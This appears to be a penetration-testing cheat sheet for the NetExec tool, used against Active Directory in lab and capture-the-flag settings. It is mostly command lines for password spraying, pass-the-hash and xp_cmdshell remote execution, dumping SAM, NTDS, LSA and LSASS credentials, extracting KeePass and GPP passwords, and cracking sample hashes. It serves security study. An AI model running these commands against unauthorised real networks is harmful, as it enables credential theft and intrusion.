---
cover: ../../.gitbook/assets/nxc_logo.avif
coverY: 0
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# netexec

[NetExec](https://www.netexec.wiki/#netexec) (`nxc`) is a **network service exploitation tool** that helps automate assessing the security of large networks. An amazing tool that makes enumerating and exploiting **Active Directory (AD) environments** exponentially more efficient! You can view its usage in almost any of the [AD-related boxes](../../boxes/categories.md).

## SMB

### Enumeration

{% tabs %}
{% tab title="Users" %}
Enumerate domain/local users:

{% code overflow="wrap" %}
```bash
# List domain users
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --users
# List local users
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --users --local-auth

# Create a users list from nxc's output
$ nxc smb <target> -u <user> -p <pass> --users | awk '$1 == "SMB" && $5 != "[+]" && $5 != "-Username-" && $5 != "[*]" {print $5}' > domain_users
```
{% endcode %}

Domain users can be also be enumerated via a RID-bruteforcing attack:

```bash
# Brute-force RIDs (default up to 4000)
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --rid-brute <max-rid>
# Create a users list from nxc's output
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --rid-brute <max-rid> > nxc_users
cat nxc_users | awk '{print $6}' | awk -F'\' '{print $2}' > domain_users
```

Enumerate domain/local hosts:

```bash
# List domain hosts
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --computers
# List local hosts
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --computers --local-auth
```
{% endtab %}

{% tab title="Shares" %}
{% code overflow="wrap" %}
```bash
# List SMB shares
nxc smb <TARGET-IP> --shares
# List SMB shares via a NULL session
nxc smb <TARGET-IP> -p '' -u '' --shares
# List SMB shares via a guest session
nxc smb <TARGET-IP> -p 'guest' -u '' --shares
# List SMB shares via an anonymous session
nxc smb <TARGET-IP> -p 'anonymous' -u '' --shares
```
{% endcode %}
{% endtab %}

{% tab title="Groups" %}
{% code overflow="wrap" %}
```bash
# List domain groups
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --groups --local-groups 
# List local groups
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --local-groups 
```
{% endcode %}
{% endtab %}

{% tab title="Active Sessions" %}
```bash
# List active sessions
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --sessions
# List logged on users
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --loggedon-users
```
{% endtab %}

{% tab title="Pass Policy" %}
```bash
# List the domain's password policy
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --pass-pol
```
{% endtab %}
{% endtabs %}

### Password Spray

Use `--local-auth` if targeting local accounts and log everything if needed (`--output results.txt`).

```bash
$ nxc smb 192.168.177.0/24 -u pete -p 'Nexus123!' -d corp.com --continue-on-success
```

If the results include the `domain` , e.g. (`seruca.yzx`) → a domain account.&#x20;

```bash
$ nxc smb ip_addresses -u 'Eric.Wallows' -p EricLikesRunning800 --continue-on-success
...
SMB 192.168.152.97  445 DC01   [+] secura.yzx\Eric.Wallows:EricLikesRunning800
```

If it has `(Pw3d!)` at the end → Local `Administrator` account.

```bash
$ nxc smb ip_addresses -u 'Eric.Wallows' -p EricLikesRunning800 --continue-on-success
...
SMB 192.168.152.97 445 DC01   [+] secura.yzx\Eric.Wallows:EricLikesRunning800
SMB 192.168.152.95 445 SECURE [+] secura.yzx\Eric.Wallows:EricLikesRunning800 (Pwn3d!)
```

### RCE

{% tabs %}
{% tab title="PtH" %}
{% code overflow="wrap" %}
```bash
nxc smb 192.168.233.212 -u Administrator --hash $(cat files01_admin_ntlm) -X 'type c:\users\administrator\desktop\flag.txt'
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Spidering

{% tabs %}
{% tab title="TXT Files" %}
```bash
nxc smb <ip> -u <user> -p <pass> --spider <share> --pattern txt
```
{% endtab %}

{% tab title="File Content" %}
```bash
nxc smb <ip> -u <user> -p <pass> --spider <share> --content --regex Encrypt
```
{% endtab %}

{% tab title="Recursive" %}
```bash
nxc smb <ip> -u <user> -p <pass> --spider <share> --regex . --depth 1
```
{% endtab %}
{% endtabs %}

### Upload/Download

If large files are failing/erroring, add  `--smb-timeout` with a value than 2.

{% tabs %}
{% tab title="Download" %}
```bash
nxc smb <ip> -u <user> -p <pass> --share <share>  --get-file <file1> <file2>
```
{% endtab %}

{% tab title="Upload" %}
```bash
nxc smb <ip> -u <user> -p <pass> --share <share>  --put-file <file1> <file2>
```
{% endtab %}

{% tab title="Share" %}
{% code overflow="wrap" %}
```bash
nxc smb <ip> -u <user> -p <pass> -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=420000 OUTPUT_FOLDER=./
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Modules

#### NIC Enumeration

{% tabs %}
{% tab title="Via WMI" %}
```bash
nxc smb <ip> -u <user> -p <pass> -M get_netconnections
```
{% endtab %}

{% tab title="Via RPC" %}
```bash
nxc smb <ip> -u <user> -p <pass> -M ioxidresolver
```
{% endtab %}
{% endtabs %}

#### KeePass Credentials

After running it check `/tmp/export.xml`.

{% tabs %}
{% tab title="Locate Config File" %}
```bash
nxc smb <ip> -u <user> -p <pass> -M keepass_discover
```
{% endtab %}

{% tab title="Check for Creds" %}
{% code overflow="wrap" %}
```bash
nxc smb <ip> -u <user> -p <pass> -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=C:/Users/julio/AppData/Roaming/KeePass/KeePass.config.xml 
```
{% endcode %}
{% endtab %}
{% endtabs %}

#### GPP

{% tabs %}
{% tab title="Plaintext Creds" %}
Retrieve the plaintext password for accounts pushed through GPPs.

```bash
nxc smb <ip> -u <user> -p <pass> -M gpp_password
```
{% endtab %}

{% tab title="Autologin Info" %}
Search for `registry.xml` files for autologin information.

```bash
nxc smb <ip> -u <user> -p <pass> -M gpp_autologin
```
{% endtab %}
{% endtabs %}

#### RDP Enablement

```bash
nxc smb <ip> -u <user> -p <pass> -M rdp -o ACTION=enable
```

{% hint style="info" %}
_For **stealing hashes via writeable shares** via SMB using `slinky`, `drop-sc`, or `scuffy` check_ [_here_](../../services/shares/smb-139-445.md#hashes)_._
{% endhint %}

### Credentials

{% tabs %}
{% tab title="SAM" %}
```bash
nxc smb <ip> -u <user> -p <pass> --sam
```
{% endtab %}

{% tab title="NTDS" %}
```bash
nxc smb <ip> -u <user> -p <pass> --ntds --user <user>
```
{% endtab %}

{% tab title="LSA" %}
```bash
nxc smb <ip> -u <user> -p <pass> --lsa
```
{% endtab %}
{% endtabs %}

The hash format that starts with `$DCC2$` (derived from `--lsa`), which stands for _Domain Cached Credentials 2_, is **stronger than NTLM** and **cannot be used for a PtH attack**. For attempting to crack them, the domain and username needs to be removed; only the value starting with `$DCC2$` is required.

{% tabs %}
{% tab title="1. Convert DCC2 Hashes" %}
{% code overflow="wrap" %}
```bash
cat /home/plaintext/.cme/logs/MS01_10.129.204.133_2022-11-08_093944.cached| cut -d ":" -f 2
$DCC2$10240#julio#c2139497f24725b345aa1e23352481f3
$DCC2$10240#david#a8338587a1c6ee53624372572e39b93f
$DCC2$10240#john#fbdeac2c1d121818f75796cedd0caf0a
```
{% endcode %}
{% endtab %}

{% tab title="2. Crack Hashes" %}
```bash
hashcat -m 2100 hashes.txt /usr/share/wordlists/rockyou.txt 
...
$DCC2$10240#julio#c2139497f24725b345aa1e23352481f3:Password1
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="LSASS" %}
```bash
nxc smb <ip> -u <user> -p <pass> -M lsassy
```
{% endtab %}

{% tab title="PROCDUMP" %}
```bash
nxc smb <ip> -u <user> -p <pass> -M procdump
```
{% endtab %}

{% tab title="HANDLEKATZ" %}
```bash
nxc smb <ip> -u <user> -p <pass> -M handlekatz
```
{% endtab %}

{% tab title="NANODUMP" %}
```bash
nxc smb <ip> -u <user> -p <pass> -M nanodump
```
{% endtab %}
{% endtabs %}

<table><thead><tr><th width="156" align="right">Module</th><th>Description</th></tr></thead><tbody><tr><td align="right"><code>lsassy</code></td><td>Python-based, it uses Impacket to read the LSASS dump and <code>pypykatz</code> to extract credentials.</td></tr><tr><td align="right"><code>procdump</code></td><td>Uses the Sysinternals Procdump to create the LSASS dump and <code>pypykatz</code> to extract credentials.</td></tr><tr><td align="right"><code>handlekatz</code></td><td>Uses clone handles to create an obfuscated dump.</td></tr><tr><td align="right"><code>nanodump</code></td><td>Opening a handle to LSASS can be detected, so it searches for existing handles, and if one is found, it copies it and creates a LSASS minidump.</td></tr></tbody></table>

## LDAP

### GMSA Password

{% code overflow="wrap" %}
```bash
nxc ldap dc01.rebound.htb -u tbrady -p tbrady_pass -k --gmsa
```
{% endcode %}

### Modules

#### User Information

The `whoami` module returns more information that just the `whoami` command.

```bash
nxc ldap <ip> -u <user> -p <pass> -M whoami -o USER=<user>
```

#### DNS Zone-Transfer

```bash
nxc ldap <ip> -u <user> -p <pass> -M get-network -o ALL=true
```

#### LAPS

```bash
nxc ldap <ip> -u <user> -p <pass> -M laps
```

#### DACL Enumeration.

{% code overflow="wrap" %}
```bash
nxc ldap <ip> -u <user> -p <pass> -M daclread -o TARGET=<user> ACTION=read
# DCSync rights
nxc ldap <ip> -u <user> -p <pass> -M daclread -o TARGET_DN="DC=inlanefreight,DC=htb" ACTION=read RIGHTS=DCSync
```
{% endcode %}

## SSH

Key authentication.

```bash
nxc ssh <ip> -u root -p '' --key-file root_id_rsa
```

## MSSQL

{% tabs %}
{% tab title="Auth" %}
Two methods can be used to authenticate to MSSQL: Windows (default) & local auth:

```bash
# 1. Windows auth

# With SMB port open
nxc mssql <target> -u <user> -p <pass>

# With SMB port closed
nxc mssql <target> -u <user> -p <pass> -d <domain>

# 2. Local auth
nxc mssql <target> -u <user> -p <pass> --local-auth
```

Ports can be also be specified:

```bash
nxc mssql <target> -u <user> -p <pass> --port <port>
```
{% endtab %}

{% tab title="Password Spray" %}
{% code overflow="wrap" %}
```bash
nxc mssql <target> -u userfile -p passwordfile --no-bruteforce --continue-on-success
```
{% endcode %}
{% endtab %}

{% tab title="PrivEsc" %}
From standard user to DBA:

```bash
# Check if possible
nxc mssql <ip> -u user -p password -M mssql_priv

# Impersonate
nxc mssql <ip> -u user -p password -M mssql_priv -o ACTION=privesc

# Rollback
nxc mssql <ip> -u user -p password -M mssql_priv -o ACTION=rollback
```
{% endtab %}

{% tab title="RCE" %}
{% code overflow="wrap" %}
```bash
# Remote queries
nxc mssql <target> -u <user> -p <pass> --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'

# System RCE via xp_cmdshell
nxc mssql <target> -u <user> -p <pass> --local-auth -x whoami
```
{% endcode %}
{% endtab %}

{% tab title="Transfers" %}
{% code overflow="wrap" %}
```bash
# Upload
nxc mssql <target> -u <user> -p <pass> --put-file /tmp/users C:\\Windows\\Temp\\whoami.txt

# Download
nxc mssql <target> -u <user> -p <pass> --get-file C:\\Windows\\Temp\\whoami.txt /tmp/file
```
{% endcode %}
{% endtab %}

{% tab title="RID BFA" %}
```bash
nxc mssql <target> -u <users> -p <pass> --rid-brute
```
{% endtab %}
{% endtabs %}

## Resources

{% tabs %}
{% tab title="Repo" %}
{% embed url="https://github.com/Pennyw0rth/NetExec" %}
{% endtab %}

{% tab title="Wiki" %}
{% embed url="https://www.netexec.wiki/" %}
{% endtab %}

{% tab title="Modules" %}
{% embed url="https://www.infosecmatter.com/crackmapexec-module-library/" %}
{% endtab %}

{% tab title="Demonstration" %}
{% embed url="https://www.youtube.com/watch?v=3SQMZzb4CnM" %}
{% endtab %}

{% tab title="HTB" %}
{% embed url="https://academy.hackthebox.com/course/preview/using-crackmapexec" %}
{% endtab %}
{% endtabs %}
